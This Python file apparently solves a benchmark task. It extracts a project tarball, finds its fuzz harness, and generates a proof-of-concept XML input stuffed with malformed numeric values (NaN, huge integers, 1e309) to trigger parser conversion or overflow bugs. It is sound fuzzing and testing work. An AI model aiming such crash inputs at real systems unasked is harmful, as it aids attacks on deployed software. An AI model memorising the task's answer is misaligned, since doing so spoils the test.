import os
import re
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp()
        try:
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    tar.extractall(path=tmpdir)
            except Exception:
                # If extraction fails for any reason, fall back to a generic PoC.
                return self._generic_xml_poc().encode("utf-8")

            harness_text = None

            # Locate a fuzz harness containing LLVMFuzzerTestOneInput.
            for dirpath, _, filenames in os.walk(tmpdir):
                for fname in filenames:
                    if not fname.endswith((".c", ".cc", ".cpp", ".cxx", ".C", ".hpp", ".hh", ".h", ".hxx")):
                        continue
                    fpath = os.path.join(dirpath, fname)
                    try:
                        with open(fpath, "r", errors="ignore") as f:
                            text = f.read()
                    except Exception:
                        continue
                    if "LLVMFuzzerTestOneInput" in text:
                        harness_text = text
                        break
                if harness_text is not None:
                    break

            # If we couldn't find a harness, just use a generic XML PoC.
            if harness_text is None:
                return self._generic_xml_poc().encode("utf-8")

            element_names, attr_names, attr_types = self._analyze_harness(harness_text)
            xml_str = self._build_xml_poc(element_names, attr_names, attr_types)
            return xml_str.encode("utf-8")
        finally:
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass

    def _analyze_harness(self, text: str):
        element_names = set()
        attr_names = set()
        attr_types = {}

        # Element patterns for common XML libraries / styles.
        element_patterns = [
            r'FirstChildElement\(\s*"([^"]+)"',
            r'first_child\(\s*"([^"]+)"',
            r'first_node\(\s*"([^"]+)"',
            r'child\(\s*"([^"]+)"',
        ]
        for pat in element_patterns:
            for m in re.finditer(pat, text):
                name = m.group(1)
                if name:
                    element_names.add(name.strip())

        # tinyxml2-style typed attribute queries: QueryIntAttribute("name", &val)
        query_pat = r'Query(Int|Unsigned|Int64|Unsigned64|Bool|Float|Double)Attribute\(\s*"([^"]+)"'
        for m in re.finditer(query_pat, text):
            tname = m.group(1)
            aname = m.group(2)
            if not aname:
                continue
            aname = aname.strip()
            attr_names.add(aname)
            attr_types.setdefault(aname, set()).add(tname)

        # pugixml-style: node.attribute("name").as_int() / as_uint / as_double / as_bool
        pugixml_pat = r'attribute\(\s*"([^"]+)"\s*\)\s*\.\s*as_(int|uint|double|bool)'
        for m in re.finditer(pugixml_pat, text):
            aname = m.group(1)
            tname = m.group(2)
            if not aname:
                continue
            aname = aname.strip()
            attr_names.add(aname)
            mapped_type = {
                "int": "Int",
                "uint": "Unsigned",
                "double": "Double",
                "bool": "Bool",
            }.get(tname, None)
            if mapped_type:
                attr_types.setdefault(aname, set()).add(mapped_type)

        # Generic attribute access patterns where we don't know the type.
        generic_attr_pats = [
            r'first_attribute\(\s*"([^"]+)"',
            r'attribute\(\s*"([^"]+)"',
            r'Attribute\(\s*"([^"]+)"',
        ]
        for pat in generic_attr_pats:
            for m in re.finditer(pat, text):
                aname = m.group(1)
                if aname:
                    attr_names.add(aname.strip())

        return element_names, attr_names, attr_types

    def _generic_xml_poc(self) -> str:
        # No project-specific info; create a generic, attribute-heavy XML
        # that stresses numeric/bool conversions.
        return self._build_xml_poc(set(), set(), {})

    def _build_xml_poc(self, element_names, attr_names, attr_types) -> str:
        # Choose element names.
        if element_names:
            elem_list = sorted({name for name in element_names if name})
        else:
            elem_list = ["root", "node", "item", "data"]

        # Ensure we have at least one element name.
        if not elem_list:
            elem_list = ["root"]

        root_name = elem_list[0]
        unique_elems = [root_name]
        for e in elem_list[1:]:
            if e != root_name:
                unique_elems.append(e)
            if len(unique_elems) >= 4:
                break
        elem_list = unique_elems

        # Choose attribute names (limit to a reasonable number).
        if attr_names:
            attr_list = sorted({name for name in attr_names if name})[:6]
        else:
            default_attrs = ["id", "width", "height", "len", "size", "count"]
            attr_list = default_attrs[:6]

        if not attr_list:
            attr_list = ["value"]

        # Generic malicious values for unknown types.
        generic_vals = [
            "NaN",
            "INF",
            "-INF",
            "1e309",
            "-1",
            "18446744073709551616",
            "9999999999999999999999999999",
            "0xFFFFFFFFFFFFFFFFFFFFFFFFF",
            "++1234",
            "123abc",
            "",
        ]

        def pick_value(attr: str, index: int) -> str:
            types = attr_types.get(attr)
            if not types:
                return generic_vals[index % len(generic_vals)]

            candidates = []
            if any(t.startswith("Unsigned") for t in types):
                candidates.extend(["-1", "18446744073709551616", "0xFFFFFFFFFFFFFFFFFFFFFFFFF"])
            if any(t in ("Int", "Int64") for t in types):
                candidates.extend(["9999999999999999999999999999", "0x7FFFFFFFFFFFFFFF0", "+-123"])
            if "Bool" in types:
                candidates.extend(["maybe", "2", "Truee"])
            if "Float" in types or "Double" in types:
                candidates.extend(["NaN", "INF", "-INF", "1e309", "1e-4000"])

            if not candidates:
                candidates = generic_vals
            return candidates[index % len(candidates)]

        lines = []
        lines.append('<?xml version="1.0" encoding="UTF-8"?>')

        # Root element with attributes.
        root_attrs_parts = []
        for i, attr in enumerate(attr_list):
            val = pick_value(attr, i)
            root_attrs_parts.append(f'{attr}="{val}"')
        root_attrs_str = " ".join(root_attrs_parts)
        lines.append(f"<{root_name} {root_attrs_str}>")

        # Inner elements with varied attribute values to trigger multiple conversions.
        loops = 3
        for depth in range(loops):
            for elem in elem_list:
                attrs_parts = []
                for i, attr in enumerate(attr_list):
                    idx = depth * len(attr_list) + i + 1
                    val = pick_value(attr, idx)
                    attrs_parts.append(f'{attr}="{val}"')
                attrs_str = " ".join(attrs_parts)
                lines.append(f"<{elem} {attrs_str}/>")

        # Extra large numeric payload as attribute to stress conversion/overflow paths.
        lines.append("<!-- extra payload -->")
        big_num = "9" * 512
        lines.append(f'<extra value="{big_num}"/>')

        lines.append(f"</{root_name}>")
        xml = "\n".join(lines)
        return xml
